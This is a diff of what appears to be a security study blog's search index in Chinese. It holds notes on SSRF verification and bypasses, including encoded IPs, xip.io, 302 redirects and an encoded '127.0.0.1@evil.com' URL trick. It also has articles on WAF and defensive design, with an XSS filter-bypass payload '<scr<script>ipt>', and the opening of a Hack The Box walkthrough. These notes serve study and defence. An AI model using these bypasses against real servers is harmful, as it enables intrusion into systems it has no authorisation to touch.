@@ -149,7 +149,7 @@
 <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
-<li>1）使用@符号绕过：如<a href="mailto:&#49;&#50;&#x37;&#46;&#48;&#46;&#x30;&#46;&#x31;&#64;&#101;&#x76;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#49;&#50;&#x37;&#46;&#48;&#46;&#x30;&#46;&#x31;&#64;&#101;&#x76;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a></li>
+<li>1）使用@符号绕过：如<a href="mailto:&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#x65;&#x76;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#x65;&#x76;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></li>
 <li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
 </ul>
 <h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="PHP中可能存在ssrf的函数"><a href="#PHP中可能存在ssrf的函数" class="headerlink" title="PHP中可能存在ssrf的函数"></a>PHP中可能存在ssrf的函数</h3><p>1）file_get_contents():把整个文件读入一个字符串中，该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
@@ -414,6 +414,106 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>WEB防护技术与体系</title>
+    <url>/2023/06/12/WEB%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%8E%E4%BD%93%E7%B3%BB/</url>
+    <content><![CDATA[<p>基本安全防护手段，比如防火墙的部署，防火墙通常部署在网络出口，用以对网络内外交互的行为进行过滤，过滤规则基于五元组“源IP、目的IP、源MAC、目的MAC、端口号”。这种简单粗暴的过滤方式在早期行之有效。</p>
+<p>但是，由于Web应用依托于应用层的HTTP\HTTPS进行开展，应用层对之下各层表现为同一端口，因此导致利用防火墙来为Web应用提供防护基本无效。主要原因是在传统防护规范中，基于TCP&#x2F;IP的<strong>五元组位于OSI七层框架中第二、三、四层</strong>（TCP&#x2F;IP模型的前三层），<strong>而Web应用位于OSI第七层</strong>（TCP&#x2F;IP模型第四层）</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152924286.png"></p>
+<p>防火墙对Web应用层面的攻击（SQL注入、XSS、upload等）基本没有防护效果。因此，利用防火墙只能对<strong>网络的边界处</strong>提供通用防护，但无法针对Web应用进行防护。目前，下一代防火墙（Next Generation Firewall）可以实现针对应用层威胁的防护。因此这里所说的防火墙是指<strong>传统的包过滤防火墙</strong>。</p>
+<h1 id="1-硬件WAF"><a href="#1-硬件WAF" class="headerlink" title="1.硬件WAF"></a>1.硬件WAF</h1><p>硬件WAF在部署时会<strong>尽可能靠近需要防护的Web服务器，并放置在Web服务器之前，采用串联的方式部署在网络中</strong>。很多情况下，WAF需要同时支持对多台服务器的防护，这时候可<strong>利用路由策略将HTTP流量引入WAF，待WAF检测完成后再发送给服务器。</strong>WAF<strong>重点针对进出Web服务器的HTTP流量进行过滤</strong>，并针对HTTP流量中的攻击行为采取阻断或告警措施。由于攻防技术不断演进，WAF系统也会定期升级，并更新各类防护策略及漏洞插件，以适应日益变更的网络攻防形态。</p>
+<p>WAF在防护方面主要有以下两个比较具有争议的特点。</p>
+<blockquote>
+<p><strong>1.代理模式</strong></p>
+<p>这种模式下，将设备部署在Web服务器前端，可将Web网站缓存到设备中，并由WAF对用户的Web请求进行响应。而且，WAF也会定期对Web网站页面进行检查，确认网站是否安全，是否存在篡改行为等。此模式在设计之初预期非常好，希望WAF充当用户与站点之间的缓冲带。但由于WAF本身并不参与Web系统服务器的工作，因此当面对用户的交互请求时，仍会由被防护的Web服务器进行响应。因此，在实际工作中开启此模式的WAF设备也相对较少。</p>
+</blockquote>
+<blockquote>
+<p><strong>2.在线攻击防护效果</strong></p>
+<p>WAF设计之初的目标就是针对SQL注入、XSS等在线攻击行为进行防护。WAF<strong>常用的方式是利用关键字匹配</strong>，通过内置的Web漏洞及攻击行为特征对用户请求进行检测。这样做的问题是误报率较高，且会阻断正常用户行为。目前，新型的WAF设备具备了自学习及类似功能，可利用<strong>机器学习的方式来扩展防护的规则库</strong>，防护效果有较明显的提升。</p>
+</blockquote>
+<p>WAF的额外功能很多，如爬虫检测功能、DDoS攻击识别功能、漏洞专项防护等。但是其标准防护技术就是疑似行为匹配。<strong>WAF内部会建立大量的规则库，</strong>涵盖各种漏洞类型的常见攻击特征、关键代码等。然后，利用正则表达式实现快速识别。当然，也会针对高危漏洞编写特定检测插件，以便精确识别当前攻击并做出防护。</p>
+<p>硬件WAF的防护思路及方案非常适合为互联网的Web应用提供防护，但事实并非如此。通常来说，WAF的性能最高能够达到Gbps级别，这主要取决于检查深入程度及设备延迟。设备延迟过高会对用户体验造成极大的影响。同时作为一款硬件设备，WAF需部署在Web服务器前端，这样在网络内就形成了一个单点情况，俗称“单点故障点”。在这种情况下，如果WAF出现硬件、系统故障情况，极可能导致网络中断。</p>
+<p>为了解决这个问题，目前WAF产品均具有<strong>双机热备&#x2F;互备功能。</strong>依赖于通用的VRRP热备协议或其他标准，在网络内可实现多台设备的相互虚拟，由协议自动监控设备状态并自动切换链路。同时设备支持硬&#x2F;软件bypass（一种断电网络连通机制，避免由于设备宕机后网络中断），采取双电源等模式，尽可能保障网络的通畅。在设备实际部署中，需根据真实的服务情况进行合理的网络配置，</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162122751.png" alt="WAF在线部署示意图"></p>
+<h2 id="1-1常用的防护规则"><a href="#1-1常用的防护规则" class="headerlink" title="1.1常用的防护规则"></a>1.1常用的防护规则</h2><p>有效的防护规则是WAF识别和阻止已知攻击的主要检测手段，也是WAF在线识别攻击的重要保证。标准的WAF规则所提供的防护功能主要包括以下方面：</p>
+<p>1.针对用户行为的识别</p>
+<blockquote>
+<p>·在线爬虫识别</p>
+<p>·用户访问频率及特征</p>
+<p>·DDoS识别</p>
+</blockquote>
+<p>2.基础攻击的防护</p>
+<blockquote>
+<p>·SQL注入防护</p>
+<p>·XSS（跨站脚本）攻击防护</p>
+<p>·跨站请求伪造防护</p>
+<p>·文件内容安全防护</p>
+<p>·命令执行漏洞防护</p>
+<p>·远程文件包含防护</p>
+</blockquote>
+<p>3.定向漏洞利用防护</p>
+<blockquote>
+<p>·Web服务器漏洞防护</p>
+<p>·Web插件漏洞防护</p>
+</blockquote>
+<p>伴随的主动检测方法有以下几种：</p>
+<p>1.网络行为归类</p>
+<p>正常的访问流量中，用户的正常流量占据主要份额。因此，WAF可将正常行为进行归类识别，并形成对应正常行为的字符串。再利用识别后得到的字符串进行匹配，对通过设备的流量进行预筛选，提高检测效率。</p>
+<p>2.不同位置的主动检测</p>
+<p>主动检测技术可通过在任意的HTTP头部字段、HTTP BODY字段中插入flag的方式对敏感行为进行标记，并针对后续行为进行观察，确认流量的合法性。</p>
+<p>3.多种检测条件的逻辑组合</p>
+<p>WAF支持将多个检测条件组合使用，并支持复杂规则的定义，用于为各类站点提供定制化的防护体系。</p>
+<p>4.支持自定义规则</p>
+<p>支持正则表达式、可在复杂业务场景下实现防护规则的自定义。</p>
+<p>总体来说，WAF为Web站点提供了良好的安全防护效果，并为各种不同类型及应用的Web系统提供了一体化的防护解决方案。因此在使用这类设备时，要根据业务特性选择适用的规则，并且可根据自身站点的情况进行规则的自定义，以发挥设备最大的防护效果。</p>
+<h2 id="1-2Apache-ModSecurity"><a href="#1-2Apache-ModSecurity" class="headerlink" title="1.2Apache ModSecurity"></a>1.2Apache ModSecurity</h2><p>ModSecurity是一个免费、开源的Apache模块，其功能是过滤各类在线攻击，因此可作为Web应用防火墙（WAF）使用。ModSecurity是一个入侵探测与阻止的引擎，它主要用于Web应用程序，所以也可以叫做Web应用程序防火墙。其官网地址为：<a href="http://www.modsecurity.org/%E3%80%82">http://www.modsecurity.org/。</a></p>
+<p>需要说明的是，OWASP是一个安全社区，开发和维护着一套免费的应用程序保护规则，这就是OWASP的ModSecurity的<strong>核心规则集</strong>（即CRS）。可以通过ModSecurity手工创建安全过滤器、定义攻击并实现主动的安全输入验证。</p>
+<blockquote>
+<p>在实际应用中，利用ModSecurity对在线Web服务提供防护的场景并不很多，大多数安全运维人员反馈ModSecurity会极大降低当前服务器的性能，严重时会对正常的Web应用产生较大影响，包括访问延迟、可接受的并发连接极大减少等。这里暂不考虑这类问题，只是针对ModSecurity的防护原理及效果进行探讨，具体情况请根据实际的环境选择使用。</p>
+</blockquote>
+<p>ModSecurity的CRS提供了非常多的防护策略，如引入第三方IP信誉库来鉴别访问请求的合法性，并支持利用爬虫技术及防病毒技术保护服务器的安全，及针对各类Web攻击的防护脚本。以SQL注入防护模块为例，</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162551197.png" alt="部分SQL注入防护规则"></p>
+<p>常见的SQL注入攻击的payload种类均已包含在其中，这类<strong>利用黑名单手段来过滤参数语句的防护效果主要取决于payload的涵盖范围</strong>。因此，也可根据自有Web的情况来添加额外的payload，从而实现良好的防护效果。针对其他Web漏洞的防护思路也与此类似。总体来说<strong>，Modsecurity仍以关键字检查及防护过滤为主，并没有添加过多的动态流及业务效果的展示。</strong>而且，Modsecurity对性能的影响比较明显，因此在商业实践环境中利用的场景并不多，在防护效果上也可近似将Modsecurity<strong>理解为初级的软件WAF效果</strong>，建议在中小站点或内网访问量有限的环境下使用。</p>
+<p>Modsecurity在易用程度方面有所欠缺，且由于Modsecurity仅适用于Apache，因此推荐使用国内的相关软件实现上述效果，这里推荐使用<strong>安全狗</strong>（<a href="http://www.safedog.cn/%EF%BC%89%E3%80%81D%E7%9B%BE%EF%BC%88http://www.d99net.net/%EF%BC%89%E7%AD%89%E9%98%B2%E6%8A%A4%E7%B1%BB%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.safedog.cn/）、D盾（http://www.d99net.net/）等防护类工具进行防护工作。</a></p>
+<h2 id="1-3防篡改软件"><a href="#1-3防篡改软件" class="headerlink" title="1.3防篡改软件"></a>1.3防篡改软件</h2><p>防篡改软件的防护思路为：<strong>定期对Web页面进行监测，如发现异常，则立即告警并恢复页面</strong>。</p>
+<p>通过直接监测页面，有异常直接告警并恢复，可保证Web应用的顺利开展。但是，防篡改软件仅仅能实现这类功能。</p>
+<p>常见的防篡改检测方式有以下几种。</p>
+<p>1）定期轮询方式</p>
+<blockquote>
+<p>用一个网页读取和检测程序，以<strong>轮询</strong>方式读出要监控的网页，与已经缓存好的真实网页进行比较，从而判断网页内容的完整性，<strong>对其中的修改内容进行合法性判断</strong>，并对被篡改的网页进行报警和恢复。</p>
+</blockquote>
+<p>（2）软件监控方式</p>
+<blockquote>
+<p>将篡改检测模块安装在Web服务器中，针对每次访问都进行完整性检查。<strong>对篡改网页及在线攻击行为进行实时访问阻断</strong>，并予以报警和恢复。在使用效果方面，这种方式类似于使用一套WAF系统，只不过是以软件形式，部署在服务器的网卡出口处进行防护。</p>
+</blockquote>
+<p>（3）事件触发方式</p>
+<blockquote>
+<p>利用操作系统的文件系统或驱动程序接口，通过程序检测网页文件当前状态。<strong>在网页文件被修改时进行合法性检查</strong>，对于非法操作进行报警和恢复。</p>
+</blockquote>
+<p>目前防篡改软件<strong>仅为事后防护机制</strong>。因此不推荐仅使用具有防篡改功能的防护类型工具。这只能解决表面的业务问题，对系统内的木马等情况，并没有很好的解决手段。当然，新的防护软件均附带监控攻击现状等功能，相当于在服务器层面安装了一套WAF，可实现在线的防护，而且也有相关免费软件的支持，如<strong>安全狗</strong>。</p>
+<h2 id="1-4云防护系统"><a href="#1-4云防护系统" class="headerlink" title="1.4云防护系统"></a>1.4云防护系统</h2><p>针对中小规模网站的实际情况，受制于成本因素，通常会选择网络上的虚拟空间或虚拟主机来部署Web应用。但是，这又会受到虚拟空间或虚拟主机本身资源或各方面的限制，直接部署各类防护软件也不太现实；或者由于本地机房硬件条件的限制，无法额外部署一套硬件WAF设备进行防护。由于日常访问量较小，直接部署一套专业的商业WAF设备也意味着安全投入产出比并不十分理想。</p>
+<p>为了解决硬件WAF成本过高、性能不佳以及需要机房环境等问题，研究人员开发了云防护系统。<strong>其防护思路为：网站管理者先将自己的域名解析地址指向云防护系统，那么在用户访问网站时，其访问的物理地址就变成了云防护系统的地址。云防护系统对用户的请求进行过滤后，再将请求发送给真实的Web服务器，从而实现在线防护。</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619164037788.png" alt="云防护系统的DNS解析"></p>
+<p>在云防护系统的安全防护基础之上，传统的Web防护体系配合云的能力，可提供更加丰富的增值防护服务。例如，利用云的高性能及高带宽实现在线DDoS攻击流量过滤、实现在线缓存及备份功能等。而且管理方式简单易行，对Web应用无任何影响，适合个人用户及中小站点用户使用。</p>
+<p>在防护效果方面，云防护系统在针对Web漏洞的防护方面与传统的WAF设备相比并没有大大区别，仍是以标准的漏洞防护方式（以参数过滤、参数转义）为主。因此，在防护效果方面，云防护系统与传统设备并没有明确的好坏之分，均可以提供在线防护能力。以国内某云防护系统为例，其针对在线攻击的防护效果良好。</p>
+<p>综上，云防护系统主要优势在于：</p>
+<blockquote>
+<p>·基于云的硬件资源可有效保障防护性能，避免了传统设备由于硬件性能产生的网络瓶颈。</p>
+<p>·只针对域名进行防护，这样也可支持CDN等方式，用户体验更佳。</p>
+<p>·无需硬件设备，可有效减少用户的初始投资。</p>
+<p>·基于大数据的防护样本分析，防护效果会进一步提升。</p>
+</blockquote>
+<p>当然，利用云防护系统还可较为简单地达到多Web应用的集中化管理的效果。相对于传统设备的规则库升级，集中管理的优势是可以将高危漏洞的响应时间缩短到小时级别，防护效果也能很好提升，并且给用户较多的防护选择空间。在实际安全防护工作开展中，可根据Web系统的真实防护需求选择使用。</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>WEB防护技术与体系</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>WEB防护技术与体系</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web源码拓展</title>
     <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
     <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
@@ -433,6 +533,76 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>Web源码拓展</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web安全防护体系</title>
+    <url>/2023/06/13/Web%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="1-Web安全核心问题"><a href="#1-Web安全核心问题" class="headerlink" title="1.Web安全核心问题"></a>1.Web安全核心问题</h1><p>安全的核心问题是：用户可以提交任意输入，但从安全角度而言，用户所有输入均不可信。</p>
+<p>1）用户侧可<strong>直接修改</strong>浏览器与服务器间<strong>传送的数据结构及内容</strong>。其中包括请求参数、Cookie内容和http消息头等方面。可轻易避开客户端执行的任何安全检测脚本，如各类型验证。</p>
+<p>2）用户侧可在任意环节及功能上<strong>多次重复提交</strong>，并且服务器均会对重复提交的内容按照<strong>同一种逻辑进行处理</strong>，这样给攻击者实现爆破攻击的机会。</p>
+<p>3）用户侧可利用浏览器、相关插件、攻击组件等多重方式<strong>对服务器进行探测</strong>，并且服务器没有有效手段控制用户侧所采用的工具类型。</p>
+<p>4）部分业务逻辑依靠用户输入的参数进行业务开展，如显示用户名、用户自有信息等，从而增加了用户与系统的<strong>交互点</strong>。</p>
+<h1 id="2-实际问题的客观引发因素"><a href="#2-实际问题的客观引发因素" class="headerlink" title="2.实际问题的客观引发因素"></a>2.实际问题的客观引发因素</h1><p>1）不健全的安全开发体系。</p>
+<p>2）开发周期的缩短及功能频繁变更。</p>
+<p>3）开发人员的不稳定性。</p>
+<p>4）运维人员的安全意识不足。</p>
+<h1 id="3-建立基本的安全框架"><a href="#3-建立基本的安全框架" class="headerlink" title="3.建立基本的安全框架"></a>3.建立基本的安全框架</h1><p>攻击者会利用各种具有服务器<strong>交互</strong>的业务功能进行各类攻击尝试，这也是Web漏洞存在的基本特点。因此在安全框架设计上，需重点关注Web应用与用户交互的方式及对应的业务流程。而且，要设计合理的用户交互规范，并对任何不应被信任的数据进行统一的过滤。</p>
+<h2 id="3-1-处理用户交互权限"><a href="#3-1-处理用户交互权限" class="headerlink" title="3.1 处理用户交互权限"></a>3.1 处理用户交互权限</h2><p>在这个过程中，<strong>要具备完整的用户访问行为处理与过滤功能。</strong>通常情况下，可根据用户的<strong>交互行为进行分类</strong>，同时结合用户的<strong>身份权限</strong>进行综合处理，如常见的匿名用户、正常通过验证的用户和管理用户权限。许多情况下，不同用户只允许访问不同的数据，例如各类用户隐私数据、订单信息等内容。</p>
+<p>目前，主流的Web应用使用三层相互关联的安全机制来处理用户访问。</p>
+<p><strong>（1）用户身份验证方式</strong></p>
+<blockquote>
+<p>身份验证机制是Web应用识别用户身份的基本机制，如用户登录功能、利用OAuth授权功能等。在这个过程中，Web应用会重点验证用户的真实身份。如果不采用这类机制，应用程序应将所有用户作为匿名用户对待。目前，大多数Web应用程序采用标准的身份验证模型，即要求用户提交用户名和密码，再由应用程序对其进行核实，确认其合法性。</p>
+</blockquote>
+<p><strong>（2）用户会话管理</strong></p>
+<blockquote>
+<p>当用户通过了Web应用的身份验证方式后，用户可访问当前Web应用并使用对应的功能。在这个过程中，Web应用会收到不同用户发出的访问请求。这期间<strong>Web应用需识别并处理每一名用户提交的各种请求</strong>，并根据用户的身份权限实施有效的访问控制，实现管理用户的会话的功能。</p>
+</blockquote>
+<p>为了实现用户会话管理功能(<em><strong>跟踪用户并保持用户信息的技术</strong></em>)，Web应用在用户身份验证通过后会为每一个用户建立一个<strong>独立的Session</strong>，并向用户生成一个具有标识功能的<strong>令牌</strong>。<strong>Session本身是一组保存在服务器上的数据结构，用于追踪用户与Web应用的交互状态。</strong>这个过程中，Web应用会利用Cookie与Session机制来实现上述功能。</p>
+<p><strong>（3）用户访问行为控制</strong></p>
+<blockquote>
+<p>Web应用需要对每个用户访问的访问请求做出响应。当前两个安全机制运作正常时，Web应用在接收到用户请求后会根据当前用户的身份状态及权限以及业务流程要求来决定响应或拒绝当前的请求。在此基础上，应用程序需要决定是否<strong>授权</strong>用户执行其所请求的操作或访问相关数据。</p>
+</blockquote>
+<h2 id="3-2处理用户输入参数"><a href="#3-2处理用户输入参数" class="headerlink" title="3.2处理用户输入参数"></a>3.2处理用户输入参数</h2><p>在用户输入参数的处理方面，有以下几个方式可供选择：</p>
+<p>（1）利用黑名单过滤用户非法输入参数</p>
+<blockquote>
+<p>Web应用会使用一个<strong>黑名单</strong>来对用户输入的参数进行过滤。黑名单中包含一组在攻击中使用过的已知的字符串或特征。Web应用需阻止任何与黑名单匹配的数据进入，并对不符合黑名单的用户输入参数进行处理。</p>
+</blockquote>
+<p>（2）利用白名单校验用户参数是否为正常输入参数</p>
+<blockquote>
+<p>白名单是一种非常好的用户参数规范校验机制，相对于黑名单来说其过滤效果更加严格。因此<strong>适用于各类对参数格式及内容有着明确要求的业务场景</strong>。Web应用会将接收到的用户参数与白名单定义的规范进行匹配，并在匹配成功后执行后续业务流程。</p>
+</blockquote>
+<p>（3）使用安全的数据方式</p>
+<blockquote>
+<p>以不安全的方式处理用户提交的数据，容易造成Web应用错误地将用户输入参数作为代码执行，是许多Web应用程序漏洞形成的根本原因。在这种状况下，通常不需要确认输入本身的合法性，只要确保处理过程绝对安全，即可避免出现各类漏洞。例如，<strong>在数据库访问过程中使用参数化查询方式</strong>，即可避免绝大部分SQL注入攻击。</p>
+</blockquote>
+<p>（4）用户行为参数检查</p>
+<blockquote>
+<p>在一些业务流程漏洞中，攻击者提交的输入参数与普通的非恶意用户提交的输入参数完全相同，这就会导致上述三种防护手段均会失效。这类行为是因为攻击者提交参数时的目的不同。例如，攻击者可能会修改Web页面隐藏表单字段提交的参数，如订单编号，企图利用修改订单编号来实现访问行为越权。</p>
+<p>因此，<strong>要在后台对用户的输入参数根据业务要求进行二次校验</strong>，方可避免这类问题的出现。</p>
+</blockquote>
+<h2 id="3-3确认用户应用边界"><a href="#3-3确认用户应用边界" class="headerlink" title="3.3确认用户应用边界"></a>3.3确认用户应用边界</h2><p>仅利用JS脚本来检查用户输入内容完全无法保证到达服务器的数据一定符合要求。服务器端应用程序第一次收到用户数据的地方是一个<strong>重要的信任边界</strong>，应用程序需要在此采取措施防御恶意输入。</p>
+<p><strong>边界确认</strong>是一种更加有效的模型。此时，服务器端应用程序的每一个单独组件或功能应将用户输入参数当作潜在的恶意来源。除客户端与服务器之间的外部边界外，Web应用程序在上述每一个信任边界上执行数据合法性确认。</p>
+<h2 id="3-4处理流程规范化"><a href="#3-4处理流程规范化" class="headerlink" title="3.4处理流程规范化"></a>3.4处理流程规范化</h2><p>在确认检查过程中，当需要在<strong>几个步骤中处理用户提交的输入</strong>时，就会出现一个输入处理机制经常遇到的问题，即<strong>如何确认用户数的参数完全合法</strong>。如果不谨慎处理该过程，攻击者就能寻找到有效的绕过方式，使得恶意数据成功避开Web应用的防护机制。例如，Web应用试图通过删除用户输入参数中的某些非法字符或表达式来过滤用户输入参数时，就会出现这种问题。</p>
+<p>以防御某些跨站点脚本攻击的方法为例，应用程序可能会从任何用户提交的数据中删除表达式：</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>但攻击者可应用以下输入避开过滤器：</p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>数据规范化会造成另外一个问题。当用户浏览器发起HTTP请求时，浏览器会将请求中的用户参数进行各种形式的编码。HTTP协议之所以使用URL编码等方案，是为了能够通过HTTP协议传送不常见的字符与二进制数据。在这个过程中，Web应用<strong>需提前将这类编码数据进行规范的转换</strong>。如果在对用户参数过滤之后再执行编码转换，攻击者就可以通过使用编码方式避开现有的防护机制。</p>
+<p>安全开发流程的核心思想是：在遵循系统功能要求的基础上，需在<strong>系统内部链接、外部传参点等各个环节中，实现标准化的防护方式及业务流程</strong>。重点在于系统交互功能的设计上。这样可在开发阶段降低各类安全风险，一方面可保证系统的稳定运行，另一方面也可减少安全防护的资金投入。</p>
+]]></content>
+      <categories>
+        <category>Web安全防护体系</category>
+        <category>《WEB安全基础》</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>Web安全防护体系</tag>
       </tags>
   </entry>
   <entry>
@@ -632,6 +802,258 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>bp工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hack the box</title>
+    <url>/2023/05/31/hack-the-box/</url>
+    <content><![CDATA[<p>下载htb的openvpn文件后，openvpn 文件</p>
+<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
+<p><a href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
+<p><a href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
+<p>ping一遍，能ping通</p>
+<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
+<p>火狐直接访问，访问不了</p>
+<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
+<p>选了个google，查找内容为123</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
+<p>很明显，post。</p>
+<p>抓包试试，加个单引号不显示内容</p>
